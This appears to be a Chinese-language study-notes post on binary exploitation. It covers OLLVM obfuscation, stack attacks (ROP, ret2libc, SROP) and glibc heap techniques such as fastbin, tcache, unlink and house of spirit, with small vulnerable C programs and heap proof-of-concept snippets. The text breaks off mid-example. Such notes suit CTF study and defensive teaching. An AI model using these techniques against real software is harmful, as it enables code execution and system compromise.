;\n代码混淆Ollvm混淆OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室发起的一个项目，是一套开源的针对LLVM的代码混淆工具,以增加对逆向工程的难度。github上地址是https://github.com/obfuscator-llvm/obfuscator，只不过仅更新到llvm的4.0，2017年开始就没在更新。\n原版提供了3种混淆方式分别是控制流扁平化,指令替换,虚假控制流程,用起来都是加cflags的方式。下面简单说下这几种模式。\n控制流扁平化这个模式主要是把一些if-else语句，嵌套成do-while语句\n-mllvm -fla：激活控制流扁平化 -mllvm -split：激活基本块分割。在一起使用时改善展平。 -mllvm -split_num&#x3D;3：如果激活了传递，则在每个基本块上应用3次。默认值：1\n指令替换这个模式主要用功能上等效但更复杂的指令序列替换标准二元运算符(+ , – , &amp; , | 和 ^)\n-mllvm -sub：激活指令替换 -mllvm -sub_loop&#x3D;3：如果激活了传递，则在函数上应用3次。默认值：1\n虚假控制流程这个模式主要嵌套几层判断逻辑，一个简单的运算都会在外面包几层if-else，所以这个模式加上编译速度会慢很多因为要做几层假的逻辑包裹真正有用的代码。\n另外说一下这个模式编译的时候要浪费相当长时间包哪几层不是闹得！\n-mllvm -bcf：激活虚假控制流程 -mllvm -bcf_loop&#x3D;3：如果激活了传递，则在函数上应用3次。默认值：1 -mllvm -bcf_prob&#x3D;40：如果激活了传递，基本块将以40％的概率进行模糊处理。默认值：30\n字符串混淆：\n用法\n-mllvm -sobf：编译时候添加选项开启字符串加密 -mllvm -seed&#x3D;0xdeadbeaf：指定随机数生成器种子\n效果\n看个添加了-mllvm -sub -mllvm -sobf -mllvm -fla -mllvm -bcf这么一串的效果。\nOllvm反混淆如何还原流程平坦化，三个问题需要解决：\n一、找出流程里所有的相关块\n二、找出各个相关块之间执行的先后顺序\n三、使用跳转指令将各个相关块连接起来\n可通过angr对函数生成CFG，也及是控制流程图。\nref: https://calendar.google.com/calendar/u/0/r?pli=1\n常见二进制漏洞整型溢出整型溢出漏洞一般是 符号类型与非符号类型数值转化造成的，比如char类型的-1转换成unsigned char，就会变成255，如果没有做好相关判断，可能会造成溢出漏洞。\n条件竞争条件竞争的话，一般出现在多线程程序或者多进程操作内存变量或文件或导致被操作内存变量或文件内容造成了不可预测的状态，\nWeb数据库业务逻辑代码漏洞就比较多一点，在linux内核驱动中，也经常出现。\n预防方案：在临界区加锁，或者让被操作的变量成为原子变量。\n格式化字符串漏洞格式化字符串漏洞是攻击者控制了格式化字符串参数，导致攻击者的输入被解析，常见拥有格式化字符串参数的函数有：\nprintf、scanf、sprintf、snprintf、fprintf、fscanf等等。比如说攻击者控制了printf的格式化参数，可以造成，堆栈内存数据泄露、任意地址读、任意地址写、以及crash程序等。\n可以通过%p来泄露堆栈内存数据\n通过%s配合地址实现任意地址数据泄露\n通过%n配合地址实现任意地址任意数据写入\n栈漏洞自己以前的培训内容:\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，发生栈溢出的基本前提是\n\n程序必须向栈上写入数据。\n\n写入的数据大小没有被良好地控制。\n\n\n例子1:\n#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123;        const char *str = &quot;12345678&quot;;        char buf[9] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9&#125;;        printf(&quot;before buf[8]:  %d\\n&quot;, buf[8]);        strcpy(buf, str);        printf(&quot;after buf[8]:  %d\\n&quot;, buf[8]);        return;&#125;\n\n例子2:\n#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123;        char buf[10];    \tscanf(&quot;%s&quot;, buf);        return;&#125;\n\n回答：\n堆栈溢出是函数的局部变量开辟的内存大小小于用户拷贝过来的数据大小所导致的一种漏洞，一般造成这种漏洞的函数常见的有strcpy、strncpy、strcat、memcpy、以及作者自己写的一些拷贝逻辑等。\n攻击者通过该漏洞可以覆盖到函数的返回地址，那么就可以实现程序流劫持，是一种比较常见的漏洞。\n在目前的编译器中，都默认开启了cannary保护来防止堆栈溢出。\nret2text攻击控制程序执行程序本身已有的的代码 (程序.text上的代码)\n一般通过堆栈溢出漏洞，劫持返回地址跳到该程序的.text端上执行代码的攻击手段，比如该程序calc函数，那么利用该手段，可以直接执行calc函数。\n例子：\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;//gcc main.c -no-pie -fno-stack-protector -o pwnvoid shell() &#123;        system(&quot;/bin/sh&quot;);&#125;int main() &#123;        char buf[32];        puts(&quot;ret2text&quot;);        read(0, buf, 0x100);        return 0;&#125;\n\n\n\nROPROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。\ngadget这里我们将使用碎片控制指令控制想要控制的寄存器。\n比如pop eax;ret;\npop eax 将栈中的可控数据弹出到eax寄存器ret 从栈中取目标指令的地址。\n数据在栈中，都是可控的，我们可以找到许多这样的碎片指令来实现控制寄存器的目的。\n我们把这些碎片指令称为gadget.\nRopgadget工具使用 \nRopgadget 工具 (安装pwntools时已经默认安装)寻找gadget：ROPgadget –binary rop –only ‘pop|ret’  | grep rdi  \n寻找字符串：ROPgadget –binary rop –string ‘&#x2F;bin&#x2F;sh’\nNX保护​\tNX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行。\n​\t在历年的编译器中，编译出来的堆栈内存页权限一般都是rwx，拥有可执行权限，若攻击者在堆栈中输入shellcode，并且利用漏洞跳到堆栈中执行shellcode，这将造成程序很容易被控制。\n​\tnx保护而是将堆栈的内存页x权限给去掉，也就是没有了可执行权限，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。\nret2shellcode在nx保护没有开启的情况下，堆栈中的内存页是拥有可执行权限的，若我们劫持返回地址跳转到堆栈中执行shellcode，那么这种手段就我们可以称为ret2shellcode，当然若其他内存页也存在rwx权限，我们在目标内存中构造好shellcode，跳转过去执行也是一样的攻击手段。\n常见的就是在老的编译器编译出来的程序中，往往堆栈中是拥有可执行权限的，所以如果出现了堆栈溢出漏洞，很容易造成任意代码执行。\nret2libc攻击通过堆栈溢出漏洞，构造rop链，劫持程序流跳转到执行glibc中的执行代码的攻击手段。\n比如：\n控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。一般情况下，我们会选择执行system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道system函数的地址。\n想要调用libc中的函数，比如system，则需要知道system的实际地址，而计算实际地址又依赖于基地址。\n所以找到基地址是关键。\n普遍采用的方法：· 泄露got表中属于libc的函数地址，再通过该地址计算基地址。实际地址 &#x3D; 基地址 + 偏移基地址 &#x3D; 实际地址 – 偏移\nStack pivotstack pivoting: 该技巧就是修改栈顶寄存器指向所能控制的内存地方，再在相应的内存地方进行 ROP。\nstack pivoting情形\n\n可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链\n\n栈地址未知，将栈劫持到已知的区域进行ROP 。\n\n\nstack pivoting常见利用手段 32位\n\npop esp; ret\n修改ebp后再执行 leave; ret的gadgets\n执行glibc中的setcontext函数中的gadgets\n\nstack pivoting常见利用手段 64位\n\npop rsp; ret\n修改rbp后再执行 leave; ret的gadgets\n执行glibc中的setcontext函数中的gadgets\n\nPartial overwritepartial overwirte也就是部分覆盖，这种方法非常常用，在栈利用和堆利用中都很常见。主要起到的作用是部分覆盖该地址内容指向我们想要的内存。\n常见情形:开启PIE保护的存在堆栈溢出留有后门的程序。堆利用中爆破glibc中的某地址情形，比如爆破修改_IO_2_1_stdout_用于泄漏libc。\nSeccompseccomp（全称secure computing mode）是linux kernel从2.6.23版本开始所支持的一种安全机制。在Linux系统里，大量的系统调用（syscall）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。通过seccomp，我们限制程序使用某些系统调用，这样可以减少系统的暴露面，同时是程序进入一种“安全”的状态。\nORW利用\n有时候程序开启seccomp规则，导致system或者execve函数中syscall调用失败，没法获得shell，那只能构造rop，采用open，read，write函数的rop来打印flag，这种利用方法称为orw。\nret2csu攻击在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。\ncsu是gcc编译器会为每个linux程序做初始化的一个函数，里面用于两个重要的gadget，可以轻松实现在64位程序下轻松构造包含3个参数的函数调用，利用该gadget的攻击手段叫做ret2csu。\n比如在64位程序下构造 open read write 调用的rop链子，这三个函数的参数都包含了三个，使用ret2csu就十分方便构造了。\ndlruntime resolve攻击dlruntime resolve攻击是一个比较复杂的攻击方式，利用了dl根据函数名称动态查找函数地址的过程传入了伪造的link map导致根据函数名称相应动态连接库函数的攻击手段。\n一般该利用方式会涉及堆栈迁移、伪造link map、got表地址偏移的计算等，64位程序构造起来比较麻烦，可能也还会涉及到ret2scu知识，32位程序有现成的工具直接生成payload。\nSROPSROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出的。采用unix系统的singal机制实现rop链的构造，然而这个机制涉及的函数调用是sigreturn，系统调用号在32位程序中是72，64位程序中是15。\nsignal 机制\nsignal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。\nuser process recevie signal  -&gt; kernel: ucontext save -&gt; user signal handler -&gt; kernel:ucontext restore -&gt; process continue\nsignal 涉及函数如下\n当由中断或异常产生时，会发出一个信号，然后会送给相关进程，此时系统切换到内核模式。再次返回到用户模式前，内核会执行do_signal()函数，最终会调用setup_frame()函数来设置用户栈。setup_frame函数主要工作是往用户栈中push一个保存有全部寄存器的值和其它重要信息的数据结构(各架构各不相同)，另外还会push一个signal function的返回地址——sigruturn()的地址。\nsrop利用方式\n在堆栈中构造造sigcontext结构体，系统调用sigruturn函数，实现背景恢复。在pwntools中，已经集成了SigreturnFrame。\nx86常用条件:int 80 reteax可控制\nx64常用条件:syscall retrax可控制\neax&#x2F; rax 控制一般我们采用read函数输入个数来进行控制。\nCannary保护随着堆栈溢出相关CVE漏洞不断曝光，攻击者很容易通过一个堆栈溢出漏洞控制rip寄存器，cannary是一个防止堆栈溢出漏洞利用的一种保护机制，在函数调用完进入函数时，会将一个cookie值储存在堆栈底部，一般储存在rbp - 8部分（局部变量的下方），在函数返回时，会检测该值与程序中储存的cannary值是否想等，如果不相等，程序就会抛出一个异常，终止程序运行。\ncannary的特性:\n\n最低byte为 00\n64位程序中，cannary值占8字节   32位程序中，cannary值占4字节\n\n泄露cannary\n若程序存在堆栈溢出漏洞，且可以覆盖到cannary部分，后续能够打印该输入内容，那么就可以泄漏cannary值。溢出覆盖到cannary最低byte，后续泄漏7字节完毕后，还需将最低’\\x00’给补回来。\nPIE保护pie保护的目的是让可执行的ELF程序加载地址进行一定的随机化，进一步提高安全性。\nALSR保护ASLR（Address Space Layout Randomization）的目的是将程序的堆栈地址和动态链接哭加载的地址进行一定的随机化。关掉ALSR，开启了PIE保护的程序，将会受到影响，地址不会随机化。关闭aslr: echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space\nlibc函数调用过程程序有一个程序链接表(PLT，Procedure Link Table)和存放函数地址的数据表，这个数据表一般称为全局偏移表（GOT, Global Offset Table），glibc函数初始化后调用时调用大致如下。\ncall printf -&gt; printf@plt, jmp print@got -&gt; printf@got, glibc printf\n然而一般程序在刚开始运行的时候，got表中的值一般都是某个plt的地址，程序跳转到该地址后会调用_dl_runtime_resolve(link_map_obj, reloc_offset)函数进行解析。\nFull RELRO保护Full Relro保护与linux下的延迟绑定机制有关，主要作用是禁止got.plt表的写入，从而阻止攻击者通过got.plt实现劫持。\n堆漏洞堆溢出是程序开辟变量存储在堆上，且该变量的大小小于来自用户存储的数据大小所造成的一种漏洞，与栈溢出造成的原因差不多，大多数是在拷贝时计算错误或者采用比较危险的函数来进行拷贝造成的。\n攻击者一般通过堆溢出结合程序实际情况，想方设法的去实现自己想要的功能，比如劫持程序流，就可以通过堆利用的各种手段去修改malloc_hook、free_hook、realloc_hook、exit_hook、以及got表等，如果程序是c++开发的，可能还有中更简单的方式，就是在堆中覆盖虚函数表地址即可。\n常见的堆主要有两大漏洞，一种是Heap Overflow，另一种是UAF (Use After Free)。\n堆利用思路一般堆漏洞经常出现 堆溢出、uaf (use after free)等漏洞，结合程序逻辑采用不同利用手段实现任意内存修改为目的。当达到任意地址修改后，若我们能够劫持某些函数指针，就可以达到劫持程序流。\n常见劫持程序流手段:\n\n修改glibc中的各种hook: __malloc_hook、__free_hook、__realloc_hook等\n\n修改elf, glibc, .so, got表\n\n\n堆介绍在程序运行过程中，对操作系统申请一个较大的内存，它允许程序申请未知大小的内存，是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长，而这块内存我们可以将他称为堆。后续开辟一些小的内存块，采用某些内存管理机制来进行管理，一般称管理堆的那部分程序为堆管理器。\nchunk结构\nstruct malloc_chunk &#123;  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */  struct malloc_chunk* fd;         /* double links -- used only if free. */  struct malloc_chunk* bk;  /* Only used for large blocks: pointer to next larger size.  */  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */  struct malloc_chunk* bk_nextsize;&#125;;\n\nprev_size: 记录的是物理相邻前一个chunk的大小（释放后），该字段也可以用来存储物理相邻的前一个 chunk 的数据 (释放前)。size: 使低3bit值为0则当前chunk的大小.size低三bit属性 (AMP):NON_MAIN_ARENA: 记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。IS_MAPPED: 记录当前 chunk 是否是由 mmap 分配的。PREV_INUSE: 记录前一个 chunk 块是否被分配， 该值为0，前一个chunk被释放。\nfd: 指向下一个空闲的 chunk (被释放)bk: 指向上一个空闲的 chunkchunk空闲的时候使用，chunk 已分配时， fd与bk是用户数据。fd_nextsize: 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。bk_nextsize: 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。chunk 空闲的时候才使用，用于large chunk。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。\ntop chunk\n在程序第一次进行 malloc 的时候，heap 会被分为两块，一块是已开辟chunk，剩下的那块就是 top chunk。 top chunk 就是处于当前堆的物理地址最高的 chunk。它不属于任何一个 bin，在所有的 bin 都无法满足用户请求的大小时，大小小于top chunk的大小时就从top chunk中分割，将剩下的部分作为新的 top chunk。若大小大于top chunk的大小，对heap 进行扩展后再进行分配。由主线程分配的chunk通过 sbrk 扩展 heap，而在子线程分配的chunk中通过 mmap 分配新的 heap。\nBinbin是chunk的回收站，它用于回收各种大小的chunk，为了下次开辟内存时，可以方便的从bin中取出合适的chunk直接分配给用户。常见的有fastbin、unsorted bin、small bin、large bin、tcache bin(glibc 2.26 &gt;&#x3D;)等等。这些bin中采用chunk的大小以及优先制度来负责把即将释放的chunk交给相应的bin来管理。\narenaarena是负责管理各种bin的机制，主线程中是main_arena，其他线程则为thread_arena，arena中包含了fastbin、unsorted bin、small bin、large bin的头节点，也记录了top chunk的地址。而main_arena是glibc中的一个全局变量，thread_arena则不一定。\nfastbinfastbin 是一个单项链表结构，空闲的chunk中的fd代表下一个同大小空闲chunk，若fd值为0，则代表当前chunk是最后一个空闲的chunk。\n一般管理大小范围: 0x01 ~ 0x80该fastbin 管理最大堆块的大小由global_max_fast来定义，该变量是存在在glibc中的一个全局变量，若该值为0,则代表即将释放的chunk不能由fastbin来管理。\n存取顺序: 先放后取\ntcahcebinglibc 2.26之后引入的机制，与fastbin类似，也是一个单向链表结构，tcache机制通过名字也可以知道，thread cache，它是用于再多线程同时管理堆块chunk时更快，在大小小于0x440以下的chunk中，由tcache bin进行管理，它有个tcache_perthread_struct在heap内存块的首地址地方(主线程)，用于管理每个线程的tcache，每个tcache中对大小进行分组，每组按照0x10对齐(64)，每个tcache中最多能够储存7个相同大小的chunk，超出的话就交给其他的bin进行管理。存取顺序: 先放后取。\n在2020-12月份，GNU组织向外发布了glibc 2.27跟新，加入glibc 2.29的特性，使其原来老的glibc 2.27利用方式变困难。在chunk free的时候，会对chunk中的bk值进行检查，若该值为tcache_perthread_struct的地址，就会抛出一个异常。绕过方法也比较简单，修改该值为非tcache_perthread_struct地址值。\nunsorted binunsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区，在加入其他bin(small bin、large bin)之前，先将其储存至unsorted bin中，数据结构是一个双向链表结构，\n储存条件:\n\n当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE(0x10)，就会被放到 unsorted bin 中。\n\n释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中\n\n\n存取顺序: 先存先取\nsmallbinsmall bin是管理小于0x400大小的chunk，数据结构是一个双向循环链表结构，\n64位一般管理大小范围: 0x20 ~ 0x3f832位一般管理大小范围: 0x10 ~ 0x1f8\nsmall bin的大小返回一般包括了fastbin管理范围，优先采用fastbin进行管理，其次再通过unsorted bin进行缓冲，若unsorted bin出现堆块分割情行，空闲的chunk符合small bin的管理范围会将其chunk交给small bin进行管理。\n存取顺序: 先存先取\nlargebinlarge bin是管理比较大的chunk，数据结构是一个双向循环链表结构，\n64位一般管理大小范围: 大于等于0x40032位一般管理大小范围: 大于等于0x200\n若unsorted bin出现堆块分割情行，空闲的chunk符合large bin的管理范围会将其chunk交给largebin进行管理。\n存取顺序: 先存先取\n攻击手段UAF全程是 use after free，是free掉内存之后再次使用该内存造成的一种漏洞，一般也是结合堆的一个利用手段去劫持各种hook从而打到劫持程序流的效果，比如最简单的例子：在老版本glibc 2.27中，引入有tcache机制，通过malloc开辟了一块内存后，调用free释放掉，架设程序员没有对指针进行清0，后面又再次调用free来释放该内存，就会导致tcache bin 的单向链表变成了循环链表，之后在申请一块内存，写入任意地址数据覆盖了下一个bin 的fd，就可以导致任意地址申请。\n其他攻击手段：\nIO_FILE利用\nfastbin attackfastbin attack，也就是利用fastbin的管理机制达到目的的一种攻击方式，可以造成开辟的堆块在任意满足fastbin条件的内存。fastbin 是一个单向链表，若能够修改fd的值指向满足某些条件fake chunk，在后续开辟内存的时候，就可以开辟堆块到fake chunk位置。常见能利用fastbin attack的漏洞:heap overflow、uaf、double free。\nfastbin回收fake chunk满足条件 [在free函数的检查]\nfake chunk 的 ISMMAP 位不能为 1(only free)，因为 free 时，如果是 mmap 的 chunk，会单独处理。 size-&gt;AMPfake chunk 地址需要对齐， MALLOC_ALIGN_MASK； （free）fake chunk 的 size 大小需要满足对应的 fastbin 的需求(malloc)，同时也得对齐(free)。fake chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem。fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。  main_arena -&gt; address == address, (free)\n\nfastbin attack - 一般 fake chunk满足条件 [在malloc函数的检查]\nfastbin attack中目标fake chunk的满足条件:之前描述的fake chunk是在malloc以及free的时候能够正常存取，但一般我们不需要使fake chunk存入到fastbin中，也就是不需要对free函数中的chunk检查进行伪造，只需要使fake chunk满足大小条件即可。该fake chunk大小满足条件范围是: [size - size % 16 , size - size % 16)+ 0xf]，如果fastbin size为0x21那么我们就需要找的fake chunk size需要在 [0x20, 0x2f]范围内\n\n\n\nFastbin attack (double free)\n其次若程序中出现double free漏洞，在fastbin 中，有一个double free检查机制，但他只会检查是否是main_arena中储存的fastbin头部是否与当前释放的chunk地址相等，若相等，则抛出异常，绕过方法也比较简单，只需让mian_arena中的fastbin头部不为当前释放的chunk就行，例子如下，在后续开辟内存的时候就可以控制b的fd指向fake chunk。\nchar *a = malloc(0x10);char *b = malloc(0x10);free(a); // main_arena -&gt; afree(b); // main_arena -&gt; b -&gt; afree(a); // main_arena -&gt; a- &gt;b -&gt; a， double free检查绕过\n\nFastbin attack (heap overflow)\n若物理相邻的下一个chunk为的fastbin chunk，当前chunk存在heap overflow，覆盖数据到下一个chunk修改fd使其指向我们的fake chunk。\ntcache bin attack在glibc 2.26后续版本中增加了tcache bin机制，这一机制让堆利用变得更加简单，类似与fastbin，也是单项链表结构，利用手段更fastbin attack差不多，但没有fack chunk的检查，这意味着若劫持tcache中的fd可以实现任意地址开辟。\nUnsorted bin attack一般不会像fastbin实现向fake chunk开辟内存，unsorted bin可以实现一个向任意地址修改其内容为一个main_arena附近的地址。\n基本来源当一个较大的 chunk 被分割成两半后，如果剩下的部分大就会被放到 unsorted bin 中。释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中。\n造成源码: glibc-2.23/malloc/malloc.c:3454/* remove from unsorted list */    unsorted_chunks (av)-&gt;bk = bck;    bck-&gt;fd = unsorted_chunks (av); //将其fake chunk的fd修改为av\n\nctf情形:有时候出现随机化的8字节key值储存在某地址中，我们已知道key的地址，还有泄漏libc，我们就可以通过unsorted bin attack将key值修改为我们已知的值。(2020祥云杯初赛 pwn1)\n若有时候程序将max_global_fast设置为0，意味着不能利用fastbin attack，我们就可以通过unsorted bin attack修改max_global_fast为一个大值，后续就可以很方便的通过fastbin attack了。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123;    char *ptr = NULL, *controllable_chunk, *trigger;    controllable_chunk = malloc(400);    malloc(10); // 防止与top chunk合并    free(controllable_chunk);    // controllable_chunk-&gt;bk = target - size_t*2    ((void **)controllable_chunk)[1] = &amp;ptr - 2;    // 这里要和free的size相同，否则会引发异常    trigger = malloc(400);    fprintf(stderr, &quot;ptr: %p\\n &quot;, ptr);    return 0;&#125;\n\n\n\nUnlink attackunlink是一种攻击手段，与unsorted bin attack差不多，这里主要讲解glibc 2.23中的unlink，古老的unlink检查比较少，这里不讨论。unlink 简单的说就是unsorted bin在进行合并堆块的时候，需要对上一个chunk进行解链。若将当前即将解链的chunk叫做P，则解链过程如下:\nP-&gt;fd-&gt;bk &#x3D; P-&gt;bkP-&gt;bk-&gt;fd &#x3D; P-&gt;fd\n这里的P-&gt;fd-&gt;bk与P-&gt;fd-&gt;fd的原来值就是P，若我们控制P的fd与bk，那么就可以实现P-&gt;fd-&gt;bk中写入P-&gt;bk的值。攻击实现效果： 合并堆块、开辟内存至我们伪造的fake chunk中。\n针对与古老的unlink就可以直接利用，但是目前glibc 2.23中的unlink检查如下：\n// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \\  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \n\n\n这就让P-&gt;fd-&gt;bk必须为P，P-&gt;bk-&gt;fd也为P，绕过其检查必须要伪造两个fack chunk，最简单的绕过方式就是通过unsorted bin本身特性绕过。这种方法可以实现堆块合并。\n我们都知道，空闲的 unsorted bin chunk其fd与bk是main_arena附近地址，若是第一个unsorted bin chunk，为了满足unsorted bin双向链表结构以及检查，则一定满足P-&gt;bk-&gt;fd &#x3D;&#x3D; P，P-&gt;fd-&gt;bk &#x3D;&#x3D; P\n若我们能够找到一块内存中储存P的地址，我们将该内存伪造成两个fake chunk，若该内存我们叫做T，则只需满足条件如下:\nP-&gt;fd &#x3D; T - 0x18  (fake chunk 1 -&gt; bk，fake chunk1为T)P-&gt;bk &#x3D; T - 0x10 (fake chunk 2 -&gt; fd， fake chunk2为T)\n那么就绕过前面提到的unlink检查。\n由于初始释放chunk为unsorted bin，在main_arena中会记录当前chunk的地址，而该chunk的fd与bk指向都满足unlink条件。若能够初始释放一个堆块为unsorted bin，若能够改写下一个prev_size以及inuse位，即很容易的实现堆块向前合并。\nhouse of einherjarglibc 2.23版本house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后的合并操作，从而使得尽可能避免碎片化。\nfree 函数中的后向合并核心操作如下\n/* consolidate backward */if (!prev_inuse(p)) &#123;\tprevsize = prev_size(p);\tsize += prevsize;\tp = chunk_at_offset(p, -((long) prevsize));\tunlink(av, p, bck, fwd);&#125;\n\n利用原理 \n两个物理相邻的 chunk 会共享 prev_size字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 prev_size 字段。一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize)) 。\n同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。(老版本libc)\nglibc 2.27版本与glibc 2.23方式差不多，只不过需要不断的释放内存构造 unsorted bin绕过unlink检查，因为存在tcache bin，当然也可以手动构造fake chunk绕过unlink。\nglibc 2.31从glibc 2.29版本之后中多了一个检查机制，会去判断被合并的chunk size与当前释放chunk的prev_size进行判断是否相等，如果相等才会去发生合并，否则抛出异常。\nOff by one &#x2F; nullglibc 2.23off by one是堆溢出的一个子集，表示堆溢出单字节，当然off by one也有另一个常见的攻击(off by null)，原理都是一样的，溢出的这一字节条件是覆盖到了下一个chunk的size域，修改size中的P位为0，代表物理相邻的chunk处于空闲状态，结合house of einherjar攻击手段，再设置prev_size可实现堆块合并效果。再次采用fastbin attack去修改__malloc_hook为one_gadget，调用malloc函数即可get shell\nglibc 2.27采用glibc 2.27的house of enherjar方式之后实现堆块合并，再采用tcache bin attack攻击修改__free_hook为system。释放包含有&#x2F;bin&#x2F;sh的堆块即可获得shell。\nHouse of SpiritHouse of Spirit 是变量覆盖和堆管理机制的组合利用，关键在于能够覆盖一个堆指针变量，使其指向可控的区域，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域。\nHouse of Spirit 利用思路\n（1）伪造堆块（2）覆盖堆指针指向上一步伪造的堆块。（3）释放堆块，将伪造的堆块释放入fastbin的单链表里面。（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。\n第一步中的伪造堆块的过程，fastbin是一个单链表结构，遵循FIFO的规则，32位系统中fastbin的大小是在1664字节之间，64位是在32128字节之间。释放时会进行一些检查，所以需要对伪堆块中的数据进行构造，使其顺利的释放进到fastbin里面，看堆free过程中相关的源代码。\npoc\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // glibc 2.23int main() &#123;        malloc(1);        unsigned long long *a;        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));        fake_chunks[1] = 0x40; // this is the size        fake_chunks[9] = 0x2240; // nextsize        a = &amp;fake_chunks[2];        free(a);        malloc(0x30);&#125;\n\nHouse of Spirit 检查绕过1\n void public_fREe(Void_t* mem) &#123;   mstate ar_ptr;   mchunkptr p;                          /* chunk corresponding to mem */     [...]   p = mem2chunk(mem); #if HAVE_MMAP  if (chunk_is_mmapped(p))                       /*首先M标志位不能被置上才能绕过。release mmapped memory. */  &#123;    munmap_chunk(p);    return;  &#125;#endif   ar_ptr = arena_for_chunk(p);   [...]   _int_free(ar_ptr, mem);\n\nHouse of Spirit 检查绕过2\n void _int_free(mstate av, Void_t* mem) &#123;   mchunkptr       p;           /* chunk corresponding to mem */   INTERNAL_SIZE_T size;        /* its size */   mfastbinptr*    fb;          /* associated fastbin */   [...]  p = mem2chunk(mem);  size = chunksize(p);  [...]  if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast)   /*其次，size的大小不能超过fastbin的最大值*/ #if TRIM_FASTBINS      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif      ) &#123;    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)       || __builtin_expect (chunksize (chunk_at_offset (p, size))                         &gt;= av-&gt;system_mem, 0))                        /*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*/      &#123;       errstr = &quot;free(): invalid next size (fast)&quot;;       goto errout;      &#125;    [...]    fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);    [...]    p-&gt;fd = *fb;  &#125;\n\n其次是伪造堆块的size字段不能超过fastbin的最大值，超过的话，就不会释放到fastbin里面了。\n最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem,否则会报invalid next size的错误。\n对应到伪造堆块poc来说，需要在可控区域1中伪造好size字段绕过第一个和第二个检查，可控区域2则是伪造的是下一个堆块的size来绕过最后一个检查。\n所以总的来说，house of spirit的主要意思是我们想要控制的区域控制不了，但它前面和后面都可以控制，所以伪造好数据将它释放到fastbin里面，后面将该内存区域当做堆块申请出来，致使该区域被当做普通的内存使用，从而目标区域就变成了可控的了。\nLarge bin attack条件：1.存在UAF或者其他漏洞能够修改同一个largbin的bk和bk_nextsize效果2.任意地址写堆地址。（任意地址写大数）\npoc\n// gcc -g -no-pie hollk.c -o hollk#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    unsigned long stack_var1 = 0;    unsigned long stack_var2 = 0;    fprintf(stderr, &quot;stack_var1 